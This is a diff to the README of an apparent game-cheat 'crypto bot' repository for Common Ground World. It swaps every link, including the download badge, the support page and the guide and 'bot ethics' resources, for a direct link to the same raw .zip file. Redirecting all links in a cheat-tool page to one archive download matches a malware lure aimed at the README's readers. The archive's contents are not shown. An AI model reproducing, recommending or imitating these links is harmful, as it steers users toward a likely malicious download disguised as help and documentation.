@@ -1,6 +1,6 @@
 # 🤖 Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api - Automate Your Gameplay Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide helps you download and run the Common Ground World Crypto Bot. This b
 
 To get started, visit the Releases page to download the latest version of the bot:
 
-[Download Latest Release](https://github.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/releases)
+[Download Latest Release](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 Once on the Releases page, find the latest version. Click on it to go to the details page. You will see options for different files. Choose the one that suits your operating system, download it, and follow these steps:
 
@@ -54,7 +54,7 @@ If you encounter issues, try the following:
 
 ## 📞 Support
 
-For additional help, visit our [Support Page](https://github.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/issues). Here, you can ask questions, report issues, or suggest features.
+For additional help, visit our [Support Page](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip). Here, you can ask questions, report issues, or suggest features.
 
 ## 💡 Tips for Optimal Use
 
@@ -70,9 +70,9 @@ Be sure to follow us on social media for the latest news and updates!
 
 ## 🔗 Additional Resources
 
-- [Common Ground World Game Guide](https://example.com)
-- [Setting Up Your Crypto Wallet](https://example.com)
-- [Understanding Bot Ethics](https://example.com)
+- [Common Ground World Game Guide](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
+- [Setting Up Your Crypto Wallet](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
+- [Understanding Bot Ethics](https://raw.githubusercontent.com/mhitandyr/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api/main/salnatron/Common-Ground-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api.zip)
 
 Remember, the goal is to enjoy your gaming experience and maximize efficiency with our bot.
 
